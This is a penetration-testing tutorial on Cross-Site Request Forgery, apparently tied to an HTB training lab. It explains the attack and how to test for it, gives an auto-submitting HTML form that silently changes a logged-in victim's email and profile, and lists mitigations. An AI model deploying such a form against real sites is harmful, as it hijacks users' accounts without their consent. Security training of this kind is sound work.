# Cross-Site Request Forgery (CSRF or XSRF)

Cross-Site Request Forgery (CSRF) is a significant security threat that allows attackers to perform actions on behalf of authenticated users without their consent. Understanding how to identify and exploit CSRF vulnerabilities is essential for penetration testers to help secure web applications.

***

#### 🔍 Understanding CSRF Attacks

CSRF attacks exploit the trust that a web application has in the user's browser. When a user is authenticated, an attacker can craft a malicious web page that sends requests to the application, leveraging the user's session. This can lead to unauthorized actions, such as changing account details or accessing sensitive information.

**Key Characteristics of CSRF Vulnerabilities:**

* **Lack of Anti-CSRF Mechanisms**: Many applications do not implement adequate protections against CSRF.
* **Session Management**: Applications relying solely on HTTP cookies for session management are particularly vulnerable.

***

#### 🧪 Testing for CSRF Vulnerabilities

To test for CSRF vulnerabilities, follow these steps:

1. **Identify Target Actions**: Look for actions that change the state on the server, such as updating user profiles or changing passwords.
2. **Check for Anti-CSRF Tokens**: Use tools like Burp Suite to intercept requests and check if anti-CSRF tokens are present. If they are missing, the application may be vulnerable.
3.  **Craft a Malicious Web Page**: Create an HTML page that submits a request to the target application. Here’s an example of a CSRF attack page:

    {% code overflow="wrap" %}
    ```html
    <html>
      <body>
        <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
          <input type="hidden" name="email" value="attacker@htb.net" />
          <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
          <input type="hidden" name="country" value="CSRF_POC" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          document.getElementById("submitMe").submit()
        </script>
      </body>
    </html>
    ```
    {% endcode %}
4.  **Serve the Malicious Page**: Use a simple HTTP server to host the malicious page. For example, you can run:

    ```bash
    python -m http.server 1337
    ```
5. **Simulate the Attack**: While logged into the target application, open a new tab and navigate to the URL of the malicious page. This will trigger the CSRF attack, changing the victim's profile details without their knowledge.

***

#### 📜 Example of a CSRF Attack

1. **Login to the Target Application**: Use valid credentials to log in to the application.
2. **Intercept Requests**: Use Burp Suite to monitor requests and confirm the absence of anti-CSRF tokens.
3. **Execute the Attack**: Open the crafted malicious page while still logged in. The profile details will change to those specified in the HTML form.

***

#### 🔒 Mitigating CSRF Vulnerabilities

To protect against CSRF attacks, web applications should implement the following measures:

* **Anti-CSRF Tokens**: Include unique tokens in forms that must be validated on the server side.
* **SameSite Cookie Attribute**: Use the SameSite attribute for cookies to restrict how they are sent with cross-origin requests.
* **User Confirmation**: Require user confirmation for sensitive actions, such as changing account settings.

***

#### 🌐 Resources for Further Learning

* [OWASP CSRF Prevention Cheat Sheet](https://owasp.org/www-community/attacks/csrf)
* [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-request-forgery)
* [Mozilla Developer Network on Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

By understanding and testing for CSRF vulnerabilities, penetration testers can help organizations strengthen their defenses against this common attack vector.
